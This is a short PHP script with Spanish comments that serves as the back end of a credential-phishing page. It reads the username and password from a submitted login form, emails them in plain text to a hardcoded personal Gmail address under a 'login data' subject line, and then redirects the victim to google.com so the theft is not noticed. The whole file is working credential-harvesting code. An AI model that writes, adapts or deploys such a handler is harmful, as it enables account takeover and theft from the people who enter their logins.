<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = $_POST["usuario"];
    $contrasena = $_POST["contrasena"];

    // Puedes personalizar el contenido del correo según tus necesidades
    $mensaje = "Usuario: $usuario\nContraseña: $contrasena";

    // Enviar el correo
    $destinatario = "lautiroca2@gmail.com";
    $asunto = "Datos de inicio de sesión";
    mail($destinatario, $asunto, $mensaje);

    // Redirigir a la página de Google después de enviar el correo
    header("Location: https://www.google.com");
    exit();
}
?>
